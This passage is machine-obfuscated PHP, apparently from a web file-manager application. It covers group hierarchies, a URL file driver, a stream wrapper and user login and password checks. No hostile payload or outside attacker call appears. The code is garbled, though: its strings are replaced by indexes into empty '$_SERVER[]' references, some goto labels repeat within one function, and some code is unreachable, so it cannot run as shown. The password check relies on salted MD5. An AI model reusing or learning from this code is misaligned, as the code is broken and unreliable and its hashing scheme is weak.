"\45{$E}\45"), $cƝĳ[957] => $cƝĳ[1774]); goto D; CƂ: return $Eߩ; goto D; D: if ($E儎) { $DÖ = $this->getInfoSimple($E儎); $b = $DÖ[$cƝĳ[481]] . $E儎 . $cƝĳ[508]; $D = array($D, array($cƝĳ[481] => array($cƝĳ[378], $b))); } $D = $this->parseWhereLike($D); $Eߩ = $this->_makeOrder()->where($D)->selectPage(20); goto d; d: $Eߩ = $Eߩ ? $Eߩ : array(); if (!$Eߩ || count($Eߩ[$cƝĳ[365]]) < 5 && Input::check($E, $cƝĳ[314])) { goto DĎى; DĎى: $dߣʾު = $this->groupChildrenAll($E儎); $BǏ = $this->_searchFromMeta($cƝĳ[437], $E, 10, $dߣʾު); $CƵ艿 = $this->_searchFromMeta($cƝĳ[438], $E, 10, $dߣʾު); goto Bɍ; Bɍ: $fΓ = array_merge($BǏ, $CƵ艿, $Eߩ[$cƝĳ[365]]); $Eߩ[$cƝĳ[365]] = array_unique_by_key($fΓ, $cƝĳ[1686]); $Eߩ[$cƝĳ[362]][$cƝĳ[363]] = count($Eߩ[$cƝĳ[365]]); goto FŰރ; FŰރ: $Eߩ[$cƝĳ[362]][$cƝĳ[364]] = ceil($Eߩ[$cƝĳ[362]][$cƝĳ[363]] / $Eߩ[$cƝĳ[362]][$cƝĳ[359]]); goto A; A: } $this->_listDataApply($Eߩ[$cƝĳ[365]]); goto CƂ; D: } protected function groupChildrenAll($cڅ) { $fಚ =& $_SERVER[]; if (!$cڅ) { return !1; } if (is_string($cڅ)) { $cڅ = array($cڅ); } $c = $cڅ; foreach ($cڅ as $B) { $Dؠ = $this->getInfoSimple($B); $Eˋ = array($fಚ[481] => array($fಚ[378], $Dؠ[$fಚ[481]] . $B . $fಚ[508])); $AԈ = $this->field($fಚ[1686])->where($Eˋ)->select(); $c = array_merge($c, array_to_keyvalue($AԈ, $fಚ[33], $fಚ[1686])); } return array_unique($c); } private function _searchFromMeta($F헑ӹ, $b, $e, $B蜆ݎ) { goto A㒤; fʫ: if (!$a煑) { return array(); } return $a煑; goto A; A㒤: $Fɉᕃ =& $_SERVER[]; $b = strtolower($b); $Fݼ = array($Fɉᕃ[92] => $F헑ӹ, $Fɉᕃ[370] => array($Fɉᕃ[378], "\x25{$b}\x25")); goto D͒; D͒: $Fݼ = $this->parseWhereLike($Fݼ); if ($B蜆ݎ) { $Fݼ[$Fɉᕃ[1686]] = array($Fɉᕃ[7], $B蜆ݎ); } $Fƫſ = Model($Fɉᕃ[1775])->where($Fݼ)->limit($e)->select(); goto Cϛ; Cϛ: if (!$Fƫſ) { return array(); } $Fƫſ = array_to_keyvalue($Fƫſ, $Fɉᕃ[33], $Fɉᕃ[1686]); $a煑 = $this->where(array($Fɉᕃ[1765] => array($Fɉᕃ[7], $Fƫſ)))->select(); goto fʫ; A: } protected function _listDataApplyItem($e) { $dܢ銮 = array($e); $this->_listDataApply($dܢ銮); return $dܢ銮[0]; } protected function _listDataApply(&$CЈ) { goto Aςۇ; A: $this->_listAppendParent($CЈ); $this->_listAppendSourceRoot($CЈ, $C); goto fќ; Aςۇ: $BħÄ =& $_SERVER[]; if (!$CЈ) { return; } $C = array_to_keyvalue($CЈ, $BħÄ[33], $BħÄ[1686]); goto cϔ; cϔ: $this->_listAppendChildren($CЈ); $this->_listAppendChildrenMember($CЈ); $this->_listAppendMeta($CЈ, $C); goto A; fќ: } private function _listAppendChildren(&$bب) { goto b٢; C: $Aݤ = array($d󫰿[472], $d󫰿[1776] => $d󫰿[474]); $A҄ = $this->field($Aݤ)->where($a؋)->group($d󫰿[472])->select(); $b̚ = array_to_keyvalue($A҄, $d󫰿[472], $d󫰿[474]); goto dܐҥ; b٢: $d󫰿 =& $_SERVER[]; $bȽ = array_to_keyvalue($bب, $d󫰿[33], $d󫰿[1686]); $a؋ = array($d󫰿[472] => array($d󫰿[7], $bȽ)); goto C; dܐҥ: foreach ($bب as &$C) { $E߉搩 = $C[$d󫰿[1686]]; $C[$d󫰿[1777]] = isset($b̚[$E߉搩]) ? intval($b̚[$E߉搩]) : !1; } unset($C); goto Aݜ; Aݜ: } private function _listAppendChildrenMember(&$A) { goto E͓; E͓: $Eʰ̏ =& $_SERVER[]; $bұ༞ = array_to_keyvalue($A, $Eʰ̏[33], $Eʰ̏[1686]); $D = array($Eʰ̏[1686] => array($Eʰ̏[7], $bұ༞)); goto F; F: $b = array($Eʰ̏[1686], $Eʰ̏[1776] => $Eʰ̏[474]); $D = Model($Eʰ̏[1768])->field($b)->where($D)->group($Eʰ̏[1686])->select(); $B՗¾ = array_to_keyvalue($D, $Eʰ̏[1686], $Eʰ̏[474]); goto A׳; A׳: foreach ($A as &$B) { $b = $B[$Eʰ̏[1686]]; $B[$Eʰ̏[1778]] = isset($B՗¾[$b]) ? intval($B՗¾[$b]) : !1; } unset($B); goto F; F: } private function _listAppendMeta(&$D􋊫, $d) { goto dѢ; a߸: foreach ($D􋊫 as &$d㑯) { $d㑯[$cָ[439]] = array(); if (isset($dو[$d㑯[$cָ[1686]]])) { $d㑯[$cָ[439]] = $dو[$d㑯[$cָ[1686]]]; } } unset($d㑯); goto B; dѢ: $cָ =& $_SERVER[]; $E̊ = array($cָ[1686] => array($cָ[7], $d)); $dو = Model($cָ[1767])->where($E̊)->select(); goto d; d: $dو = array_to_keyvalue_group($dو, $cָ[1686]); foreach ($dو as &$e澢) { $e澢 = array_to_keyvalue($e澢, $cָ[92], $cָ[370]); } unset($e澢); goto a߸; B: } protected function parentLevelArray($dͪ) { $Eƿ =& $_SERVER[]; $dͪ = explode($Eƿ[47], trim($dͪ, $Eƿ[47])); $dͪ = array_remove_value($dͪ, $Eƿ[491]); return $dͪ; } private function _listAppendParent(&$dނ) { goto B; e: foreach ($dނ as &$aϦ) { $d = $this->parentLevelArray($aϦ[$fϪ[481]]); $b = $fϪ[33]; foreach ($d as $f => $c͊) { if ($D̆ǽЪ && $f == 0) { continue; } $b .= $e𺴌[$c͊] . $fϪ[8]; } if ($d) { $b .= $aϦ[$fϪ[28]]; } $aϦ[$fϪ[485]] = str_replace($fϪ[490], $fϪ[8], $b); } unset($aϦ); goto cһ; B: $fϪ =& $_SERVER[]; $e𺴌 = array(); foreach ($dނ as &$aϦ) { $e𺴌[$aϦ[$fϪ[1686]]] = $aϦ[$fϪ[28]]; $d = $this->parentLevelArray($aϦ[$fϪ[481]]); foreach ($d as $c͊) { if (!isset($e𺴌[$c͊])) { $e𺴌[$c͊] = 0; } } } goto aڑ֒; aڑ֒: unset($aϦ); foreach ($e𺴌 as $f => $f륳) { if ($f륳) { continue; } $e˻ = $this->getInfoSimple($f); $e𺴌[$f] = $e˻[$fϪ[28]]; } $D̆ǽЪ = $GLOBALS[$fϪ[6]][$fϪ[87]][$fϪ[1779]]; goto e; cһ: } private function _listAppendSourceRoot(&$C贘, $eР) { goto aܴ; B턶: $d̿ = Model($e܂[790])->order($e܂[1781])->field($F)->where($bʋې)->select(); $d̿ = array_to_keyvalue($d̿, $e܂[478]); $d̿ = array_remove_key($d̿, $e܂[478]); goto E; aܴ: $e܂ =& $_SERVER[]; $bʋې = array($e܂[398] => SourceModel::TYPE_GROUP, $e܂[472] => 0, $e܂[478] => array($e܂[7], $eР)); $F = $e܂[1780]; goto B턶; E: foreach ($C贘 as &$e) { $e[$e܂[84]] = $d̿[$e[$e܂[1686]]] ? $d̿[$e[$e܂[1686]]] : array(); } unset($e); goto E͐; E͐: } protected function groupMerge($d) { $d = array_values(array_unique($d)); $f = array(); for ($F۲ = 0; $F۲ < count($d); $F۲++) { $F = !1; for ($fםэ = 0; $fםэ < count($d); $fםэ++) { if ($F۲ == $fםэ) { continue; } if ($this->isParentOf($d[$fםэ], $d[$F۲])) { $F = !0; break; } } if (!$F) { $f[] = $d[$F۲]; } } return $f; } protected function isParentOf($F賣, $b) { goto cߕ; cߕ: $c̬ =& $_SERVER[]; if (!$F賣 || !$b || $F賣 == $b) { return !1; } $dȅ = $this->getInfoSimple($F賣); goto bÏ; d䩈: return !1; goto fّ; bÏ: $C긙 = $this->getInfoSimple($b); $F˻咯 = $dȅ[$c̬[481]] . $F賣 . $c̬[47]; if (substr($C긙[$c̬[481]], 0, strlen($F˻咯)) == $F˻咯) { return !0; } goto d䩈; fّ: } public function groupShowRoot($E, $Fᰞ = false) { goto b; b: $dе =& $_SERVER[]; $Aш = $this->getInfo($E); if (!$Aш) { return array(); } goto eմڣ; eմڣ: $EЂا = $this->parentLevelArray($Aш[$dе[481]]); $c = array($E); if (count($EЂا) == 0) { return $c; } goto BȪ; BȪ: if ($Fᰞ && count($EЂا) == 1) { return $c; } if (!$Aш[$dе[439]] || !isset($Aш[$dе[439]][$dе[1763]]) || $Aш[$dе[439]][$dе[1763]] == $dе[1737]) { return $this->groupShowRoot($EЂا[count($EЂا) - 1], $Fᰞ); } if ($Aш[$dе[439]][$dе[1763]] == $dе[355]) { $DĘ = explode($dе[47], $Aш[$dе[439]][$dе[1764]]); if ($DĘ) { $c = array_merge($c, $DĘ); } } goto a; a: return $c; goto Aǝ; Aǝ: } protected function resetParentLevel() { $Bܚ =& $_SERVER[]; $c韅 = $Bܚ[1686]; $a = $this->select(); $a = array_to_keyvalue($a, $c韅); foreach ($a as $a¶) { goto Aǋ; Aǋ: $F = $a¶; $F˖ = array(); while ($F[$Bܚ[472]] != 0) { $F˖[] = $F[$Bܚ[472]]; $F = $a[$F[$Bܚ[472]]]; } goto b; b: $F˖[] = 0; $F˖ = $Bܚ[47] . implode($Bܚ[47], array_reverse($F˖)) . $Bܚ[47]; $this->setNamePinyin($a¶[$c韅], $a¶[$Bܚ[28]]); goto c䣬; c䣬: $this->where(array($c韅 => $a¶[$c韅]))->save(array($Bܚ[548] => $F˖)); goto Eӄ; Eӄ: } return $a; } public function groupNameAuto($A, $AΤԉ) { $AԆ =& $_SERVER[]; $d叫 = $this->where(array($AԆ[389] => $A))->getField($AԆ[28], !0); if (!$d叫 || !in_array($AΤԉ, $d叫)) { return $AΤԉ; } for ($C = 1; $C <= count($d叫) + 1; $C++) { $b໢ = $AΤԉ . "\x28{$C}\x29"; if (!in_array($b໢, $d叫)) { return $b໢; } } } public function groupSwitch($bı, $Dǩ) { goto b; AԷ: $AЍ = !empty($aُ[$bı]) ? $aُ[$bı] : !1; if ($AЍ) { goto AՍ˪ϒ; AՍ˪ϒ: if (!$aُ[$Dǩ]) { $aُ[$Dǩ] = Model($c듩[790])->groupRootAdd($Dǩ); } $aƞ = $aُ[$Dǩ]; $b˃ = array($c듩[472] => $AЍ); goto Cǿ; Cǿ: $aُ = Model($c듩[790])->where($b˃)->field($c듩[1784])->select(); if (!$aُ) { $aُ = array(); } Model($c듩[790])->moveClearAuth = !1; goto E; dړ: $EŜ = array($c듩[478] => $Dǩ); Model($c듩[1785])->where($b˃)->save($EŜ); Model($c듩[1786])->where($b˃)->save($EŜ); goto e˓; E: foreach ($aُ as $c) { $CƐː = $c[$c듩[397]] == $c듩[86] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($c듩[790])->move($c[$c듩[390]], $aƞ, $CƐː); } Model($c듩[790])->moveClearAuth = !0; $b˃ = array($c듩[398] => 2, $c듩[478] => $bı); goto dړ; e˓: } $this->_changeChildLevel($d[$bı], $d[$Dǩ], !0); goto E; E: $this->where(array($c듩[472] => $bı))->save(array($c듩[472] => $Dǩ)); return !0; goto fӢ; b: $c듩 =& $_SERVER[]; $b˃ = array($c듩[1686] => array($c듩[7], array($bı, $Dǩ))); $d = $this->where($b˃)->select(); goto Eۇ; d: $b˃ = array($c듩[398] => 2, $c듩[472] => 0, $c듩[397] => 1, $c듩[478] => array($c듩[7], array($bı, $Dǩ))); $aُ = Model($c듩[790])->where($b˃)->field($c듩[1783])->select(); $aُ = array_to_keyvalue($aُ, $c듩[478], $c듩[390]); goto AԷ; e۝Ȩ: $Fʫ = Model($c듩[1768])->where($b˃)->select(); if (!$Fʫ) { $Fʫ = array(); } foreach ($Fʫ as $bɐڕ) { $Bև = $bɐڕ[$c듩[1523]]; $b˃ = array($c듩[1523] => $Bև, $c듩[1686] => $Dǩ); $f𬣌 = Model($c듩[1768])->where($b˃)->find(); if (!$f𬣌) { $bԋ = array($Dǩ => $bɐڕ[$c듩[1782]]); Model($c듩[501])->userGroupAdd($Bև, $bԋ); } Model($c듩[501])->userGroupRemove($Bև, $bı); } goto d; Eۇ: $d = array_to_keyvalue($d, $c듩[1686]); if (!isset($d[$bı]) || !isset($d[$Dǩ]) || $d[$bı][$c듩[472]] == 0) { return !1; } $b˃ = array($c듩[1686] => $bı); goto e۝Ȩ; fӢ: } } goto A; a: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($f = false) { } public function exist($A瞃) { $D = $this->info($A瞃); return $D[$_SERVER[][193]]; } public function isFile($B) { $b = $this->info($B); return $b[$_SERVER[][193]]; } public function isFolder($cӶ) { return !1; } public function size($fʙ) { $a䈳 = $this->info($fʙ); return $a䈳[$_SERVER[][77]]; } public function info($Dч) { return $this->infoParse($Dч); } public function infoAuth($dПᄑ) { return $this->infoParse($dПᄑ); } public function infoWithChildren($eװ) { return $this->infoParse($eװ); } public function infoFull($bƵʲ) { return $this->infoParse($bƵʲ); } private function infoParse($e͆Ɣϡ) { $Fш =& $_SERVER[]; $aۭğ = $this->header($e͆Ɣϡ); if (!$aۭğ || !$aۭğ[$Fш[725]]) { return !1; } $fʖ = _get($aۭğ, $Fш[333], 0); $eؚ« = array($Fш[28] => $aۭğ[$Fш[28]], $Fш[75] => $e͆Ɣϡ, $Fш[29] => $Fш[173], $Fш[77] => intval($fʖ), $Fш[167] => get_path_ext($aۭğ[$Fш[28]]), $Fш[1252] => $fʖ > 0 && $aۭğ[$Fш[1373]], $Fш[1253] => !1); return $eؚ«; } private function header($F꾆) { goto D; D: $BŮ =& $_SERVER[]; if (isset(self::$_cacheHeader[$F꾆])) { return self::$_cacheHeader[$F꾆]; } $a獅 = isset($GLOBALS[$BŮ[1374]]) ? $GLOBALS[$BŮ[1374]] : !1; goto bϬ; bে: return self::$_cacheHeader[$F꾆]; goto E; bϬ: $GLOBALS[$BŮ[1374]] = !0; self::$_cacheHeader[$F꾆] = url_header($F꾆); $GLOBALS[$BŮ[1374]] = $a獅; goto bে; E: } public function hashSimple($BĐ, $A = false) { goto B; B: $bӑħ =& $_SERVER[]; $E붏͉ = $this->info($BĐ); if (!$E붏͉ || !$E붏͉[$bӑħ[193]]) { return !1; } goto E𸕛; E𸕛: $D = $E붏͉[$bӑħ[77]]; $bӗ = 200; $C = 50; goto C°; d: $eޓ = timeFloat(); $D̙ = 15; for ($B = 0; $B < $C; $B++) { if (timeFloat() - $eޓ > $D̙) { return !1; } $b臒 = $this->fileSubstr($BĐ, $C * $B, $bӗ); if (!$b臒) { return !1; } $fϑ .= $b臒; } goto fІً; fІً: $fϑ .= $this->fileSubstr($BĐ, $D - $bӗ, $bӗ); return md5($fϑ) . $D; goto e͘ő; C°: if ($D <= $bӗ * $C) { return md5($this->fileSubstr($BĐ, 0, $D)) . $D; } $C = intval($D / $C); $fϑ = $bӑħ[33]; goto d; e͘ő: } public function getContent($b͊) { return $this->fileSubstr($b͊); } public function fileSubstr($CҲ, $B͸ = 0, $a؆㲥 = -1) { goto EÄ; EÄ: $Cإܠ =& $_SERVER[]; $c = $this->info($CҲ); if (!$c || !$c[$Cإܠ[193]] && $c[$Cإܠ[77]] > 1024 * 1024 * 10) { return !1; } goto A⥛; eю: $Eݡ = url_request($CҲ, $Cإܠ[226], !1, $F񣱢, !1, !1, 1); return $Eݡ[$Cإܠ[1087]] ? $Eݡ[$Cإܠ[1087]] : $Cإܠ[33]; goto B; A⥛: if ($a؆㲥 === -1) { $a؆㲥 = $c[$Cإܠ[77]]; } if ($a؆㲥 == 0) { return $Cإܠ[33]; } $F񣱢 = array($Cإܠ[1375] . $B͸ . $Cإܠ[751] . ($B͸ + $a؆㲥 - 1)); goto eю; B: } public function download($aη, $B喋) { Downloader::start($aη, $B喋); return $B喋; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($f, $e = '') { goto b㺚; A꿛: $this->pathOpen = $f; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto D; D: if (!isset(self::$_chunkBuffer[$f])) { self::$_chunkBuffer[$f] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto d; b㺚: $this->info = $this->info($f); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[][75]]; goto A꿛; d: } function stream_read($eҔތ) { $dܤؒ = $this->fileSubstr($this->pose, $eҔތ); $this->pose += strlen($dܤؒ); return $dܤؒ; } public function stream_tell() { return $this->pose; } public function stream_seek($E˻, $E) { $cͳ =& $_SERVER[]; if ($E == SEEK_SET) { $this->pose = $E˻; } else { if ($E == SEEK_CUR) { $this->pose += $E˻; } else { if ($E == SEEK_END) { $this->pose = $this->info[$cͳ[77]] + intval($E˻); } } } if ($E˻ < 0) { $this->pose = $this->info[$cͳ[77]] + $E˻; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[][77]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($D, $E񇳜) { $bˡ =& $_SERVER[]; $cʰ = $this->info($D); return array($bˡ[1376] => 0, $bˡ[1377] => 0, $bˡ[12] => 32768 + 511, $bˡ[1378] => 0, $bˡ[1379] => 0, $bˡ[1380] => 0, $bˡ[1381] => 0, $bˡ[77] => $cʰ[$bˡ[77]], $bˡ[1382] => $cʰ[$bˡ[1251]], $bˡ[1338] => $cʰ[$bˡ[83]], $bˡ[1337] => $cʰ[$bˡ[192]], $bˡ[1383] => 0, $bˡ[1384] => 0); } static $fileInfo = array(); public function info($fö) { $cم = $_SERVER[][1385]; if (isset(self::$fileInfo[$fö])) { return self::$fileInfo[$fö]; } if (substr($fö, 0, strlen($cم)) != $cم) { return !1; } self::$fileInfo[$fö] = IO::info(substr($fö, strlen($cم))); return self::$fileInfo[$fö]; } public static function read($c򙭷, $d͝, $aĹН) { if (!isset(self::$_fopenCache[$c򙭷])) { $f֓ = new StreamWrapperIO(); $f֓->stream_open($c򙭷); self::$_fopenCache[$c򙭷] = $f֓; } $f֓ = self::$_fopenCache[$c򙭷]; return $f֓->fileSubstr($d͝, $aĹН); } public static function _read($Fᬫ, $D, $dڬ) { goto D; c: return $f撳; goto d; C: $F = 8192; fseek($Dƅ, $D, SEEK_SET); $f撳 = $E۫[33]; goto a; D: $E۫ =& $_SERVER[]; $Dƅ = fopen($Fᬫ, $E۫[1255]); if (!$Dƅ) { return $E۫[33]; } goto C; a: $cʑ = 0; while ($cʑ < $dڬ) { $BӴ = min($F, $dڬ - $cʑ); $f撳 .= fread($Dƅ, $BӴ); $cʑ += $BӴ; } fclose($Dƅ); goto c; d: } public function fileSubstr($C, $Eڑ) { goto B; d߰: $f = 0; $Cᇡ = 0; $fʧ = $Cʝ[33]; goto A킍; e䑔ޒ: ksort($a); $C = substr($fμĦ, $C - $f, $Eڑ); return $C; goto eƶ; CιЈ: $aͿ = $Eڑ; if ($C < 0) { $C = $e + $C; } if ($Eڑ === !1) { $Eڑ = $e - $C; } goto a; Eި: $fԮ٘ = 64 * 1024; $a =& self::$_chunkBuffer[$this->path]; if (!$a) { $a = array(); } goto d߰; B: $Cʝ =& $_SERVER[]; $e = $this->info[$Cʝ[77]]; $bȹ = $C; goto CιЈ; a: if ($C + $Eڑ > $e) { $Eڑ = $e - $C; } if ($Eڑ <= 0) { return $Cʝ[33]; } if ($C < 0 || $C >= $e || $Eڑ <= 0 || $Eڑ > 1024 * 1024 * 5) { throw new Exception("\151\x6f\x46\x69\154\145\x52\x65\141\x64\40\x65\162\162\157\162\x21\40\163\164\141\x72\x74\75{$C}\x3b\154\x65\x6e\x67\x74\150\x3d{$Eڑ}\73\40\x73\151\x7a\x65\x3d{$e}\73"); } goto Eި; eɿ: $Bǲ = ceil(($C + $Eڑ) / $fԮ٘) * $fԮ٘ - $f; $fμĦ = IO::fileSubstr($this->path, $f, $Bǲ); $a[$f . $Cʝ[33]] = $fμĦ; goto e䑔ޒ; A킍: foreach ($a as $f => $fʧ) { $f = intval($f); $Cᇡ = $f + strlen($fʧ); if ($C >= $Cᇡ) { continue; } if ($C >= $f && $C + $Eڑ <= $Cᇡ) { return substr($fʧ, $C - $f, $Eڑ); } break; } if (count($a) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Cʝ[1386], $Cʝ[1387] . count($a) . "\73\x73\164\141\162\x74\75{$C}\x2c\x6c\145\156\x67\x74\x68\x3d{$Eڑ}\73\x70\157\163\x65\x3a{$f}\x7e{$Cᇡ}"); throw new Exception($Cʝ[1388]); } $f = intval($C / $fԮ٘) * $fԮ٘; goto eɿ; eƶ: } private function log($d͒, $A󛧈) { $Cت٬ =& $_SERVER[]; $b = timeFloat() - $this->timeStart; write_log(sprintf($Cت٬[1389], $d͒, $this->info[$Cت٬[28]], $b, $A󛧈), $Cت٬[1077]); } } class Message { function __construct() { } public function send($F⦷ = '', $cԄ = array(), $dҞ = "\x74\145\170\164") { goto eً±; eً±: $A =& $_SERVER[]; $Eԛ墌 = array($A[29] => $A[1390], $A[728] => $F⦷); if (in_array($dҞ, array($A[1390], $A[1391]))) { $Eԛ墌[$A[29]] = $dҞ; } goto aћ; Dѫ: Hook::trigger($A[1393], $a); goto E݌ȟ; aћ: $cԄ = array($A[1015] => isset($cԄ[$A[1015]]) ? $cԄ[$A[1015]] : $A[33], $A[557] => isset($cԄ[$A[557]]) ? $cԄ[$A[557]] : $A[33]); if (empty($F⦷) || empty($cԄ[$A[1015]]) && empty($cԄ[$A[557]])) { return !1; } $a = array($A[1331] => $Eԛ墌, $A[1392] => $cԄ); goto Dѫ; E݌ȟ: } } goto b; cĈ벚: class UserModel extends ModelBase { protected $tableName = "\x75\163\145\x72"; protected $tableMeta = array("\164\141\142\154\145\116\x61\x6d\x65" => "\165\163\x65\162\137\155\x65\x74\141", "\155\145\x74\x61\106\x69\x65\154\144" => "\165\x73\145\162\111\104"); protected $simpleField = "\165\x73\145\x72\111\x44\x2c\x6e\151\x63\153\116\141\x6d\145\54\156\141\155\145\54\x61\x76\x61\164\x61\162\x2c\x73\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($aɬ) { $Fގ =& $_SERVER[]; $F = $Fގ[2105]; return array($Fގ[1757] => array($aɬ[0], $F), $Fގ[1759] => array($aɬ[0], $F), $Fގ[2106] => array($aɬ[0], $F)); } protected function getInfo($dߗΦ۳, $F֓ = false) { $c㵾瞿 = $this->getInfoSimple($dߗΦ۳); if (!is_array($c㵾瞿)) { return array(); } if ($F֓) { return $this->_getInfoApply($c㵾瞿); } return $this->cacheFunctionGet($_SERVER[][1766], $dߗΦ۳); } protected function getInfoFull($Fҏ, $DН = false) { $E = $this->getInfoSimple($Fҏ); if (!is_array($E)) { return array(); } if ($DН) { return $this->_getInfoApply($E, !0); return $this->_getInfoApply($E, !0); } return $this->cacheFunctionGet($_SERVER[][2107], $Fҏ); } private function _getInfoApply($D펠, $d𷟈η = false) { goto e; dĥ͑: $D펠[$D킉[84]][$D킉[1946]] = isset($Eóʽ[$D킉[1947]]) ? $Eóʽ[$D킉[1947]] : null; if ($d𷟈η) { $D펠[$D킉[439]] = $this->metaGet($D펠[$D킉[1523]]); } return $D펠; goto Dݼ않; e: $D킉 =& $_SERVER[]; if (!$D펠) { return $D펠; } $f߷ = md5($D킉[2108] . $D펠[$D킉[849]] . $D킉[2109] . $D펠[$D킉[28]]); goto c쒜; c쒜: $D펠 = $this->_listDataApplyItem($D펠); $Eóʽ = Model($D킉[1203])->metaGet($D펠[$D킉[84]][$D킉[390]]); $D펠[$D킉[2110]] = $f߷; goto dĥ͑; Dݼ않: } protected function getInfoSimple($aŨ䣈, $dբͣ = false) { $Eń =& $_SERVER[]; if (!$aŨ䣈) { return array(); } if ($dբͣ) { $e񑎴 = $this->where(array($Eń[1523] => intval($aŨ䣈)))->find(); if (!is_array($e񑎴)) { return array(); } $e񑎴[$Eń[2111]] = Action($Eń[2112])->parseUrl($e񑎴[$Eń[2111]]); return $e񑎴; } return $this->cacheFunctionGet($Eń[1760], $aŨ䣈); } protected function getInfoSimpleOuter($C˂) { goto DƬ; BǍ: $DΏ = array_field_key($c, explode($bҧ[47], $this->simpleField)); if (!$DΏ) { return array($bҧ[1523] => $bҧ[1084], $bҧ[28] => $bҧ[159] . LNG($bҧ[2115]) . $bҧ[499], $bҧ[2111] => STATIC_PATH . $bҧ[2116]); } $DΏ[$bҧ[2111]] = Action($bҧ[2112])->parseUrl($DΏ[$bҧ[2111]]); goto EԗÎ; EԗÎ: return $DΏ; goto c⃃; DƬ: $bҧ =& $_SERVER[]; if (!$C˂ || $C˂ == 0) { return array($bҧ[1523] => $bҧ[491], $bҧ[28] => $bҧ[159] . LNG($bҧ[2113]) . $bҧ[499], $bҧ[2111] => STATIC_PATH . $bҧ[2114]); } $c = $this->cacheFunctionGet($bҧ[1760], $C˂); goto BǍ; c⃃: } protected function groupUser($B) { } public static function errorLang($C㣪Ն) { $Fȶ֑ =& $_SERVER[]; $fٝڕ = array(self::ERROR_USER_NOT_EXISTS => $Fȶ֑[2117], self::ERROR_USER_PASSWORD_ERROR => $Fȶ֑[2118], self::ERROR_USER_EXIST_NAME => $Fȶ֑[2119], self::ERROR_USER_EXIST_PHONE => $Fȶ֑[2120], self::ERROR_USER_EXIST_EMAIL => $Fȶ֑[2121], self::ERROR_USER_LOGIN_LOCK => $Fȶ֑[2122], self::ERROR_IP_NOT_ALLOW => $Fȶ֑[2123], self::ERROR_USER_EXIST_NICKNAME => $Fȶ֑[2124]); return LNG($fٝڕ[$C㣪Ն]); } public function getInfoByMeta($Cө, $fˬ) { $d =& $_SERVER[]; $Bٹ̉Ց = Model($d[2125])->where(array($d[92] => $Cө, $d[370] => $fˬ))->find(); if ($Bٹ̉Ց) { return $this->getInfo($Bٹ̉Ց[$d[1523]]); } return !1; } public function userLoginCheck($E⻡, $BȖ) { $D =& $_SERVER[]; $eˢݫ = $this->userLoginFind($E⻡); if (!$eˢݫ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($eˢݫ[$D[1523]], $BȖ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($eˢݫ[$D[1523]]); } public function userLoginFind($fτ) { $Cǅ =& $_SERVER[]; $C = array($Cǅ[28] => $fτ, $Cǅ[1950] => $fτ, $Cǅ[301] => $fτ, $Cǅ[2126] => $fτ, $Cǅ[957] => $Cǅ[959]); if ($this->nickNameRpt()) { unset($C[$Cǅ[1950]]); } return $this->where($C)->find(); } public function clearCache($a) { $Bθټ =& $_SERVER[]; $this->cacheFunctionClear($Bθټ[1766], $a); $this->cacheFunctionClear($Bθټ[1760], $a); $this->cacheFunctionClear($Bθټ[2107], $a); } public function userPasswordCheck($a, $C޶) { $dՈ =& $_SERVER[]; $Dş = $this->where(array($dՈ[1523] => intval($a)))->find(); $Aב = $this->metaGet($a); $d͎Ȉ = isset($Aב[$dՈ[2127]]) ? $Aב[$dՈ[2127]] : $dՈ[33]; if (md5($d͎Ȉ . trim($C޶)) !== $Dş[$dՈ[849]]) { return !1; } return !0; } public function userAdd($b͖) { goto E툾; b򧩒: return $Bِͮ; goto A; E׃: $e͉ = array($fڈ[2135] => $C[$fڈ[849]], $fڈ[2131] => $C[$fڈ[1950]]); $this->userEdit($Bِͮ, $e͉); Model($fڈ[1203])->userRootAdd($Bِͮ); goto b򧩒; Cܵ: $B = $this->_checkExist($b͖); if ($B !== !0) { return $B; } $Bِͮ = $this->add($C); goto E׃; E툾: $fڈ =& $_SERVER[]; $C = array($fڈ[407] => $b͖[$fڈ[28]], $fڈ[2128] => $b͖[$fڈ[1407]], $fڈ[2129] => isset($b͖[$fڈ[301]]) ? $b͖[$fڈ[301]] : $fڈ[33], $fڈ[2130] => isset($b͖[$fڈ[2126]]) ? $b͖[$fڈ[2126]] : $fڈ[33], $fڈ[2131] => isset($b͖[$fڈ[1950]]) ? $b͖[$fڈ[1950]] : $b͖[$fڈ[28]], $fڈ[2132] => isset($b͖[$fڈ[2111]]) ? $b͖[$fڈ[2111]] : $fڈ[33], $fڈ[2133] => isset($b͖[$fڈ[2134]]) ? $b͖[$fڈ[2134]] : 1, $fڈ[2135] => $b͖[$fڈ[849]], $fڈ[1761] => isset($b͖[$fڈ[1670]]) ? $b͖[$fڈ[1670]] : 1024 * 1024 * 20, $fڈ[1762] => 0, $fڈ[2136] => 0, $fڈ[1805] => isset($b͖[$fڈ[725]]) ? $b͖[$fڈ[725]] : 1); if (!empty($b͖[$fڈ[1523]])) { $C[$fڈ[1523]] = $b͖[$fڈ[1523]]; } goto Cܵ; A: } protected function userEditTest($b, $F) { return $this->call($_SERVER[][2137], $b, $F); } protected function userEdit($a୐, $bޤ) { goto cު; cު: $E᚜ =& $_SERVER[]; $e = $this->getInfoSimple($a୐); if (!$e) { return !1; } goto Cꗈ; f𥔊: return !0; goto A̋; Cꗈ: $CÂݎ = $this->_checkExist($bޤ, $a୐); if ($CÂݎ !== !0) { return $CÂݎ; } if (isset($bޤ[$E᚜[849]]) && 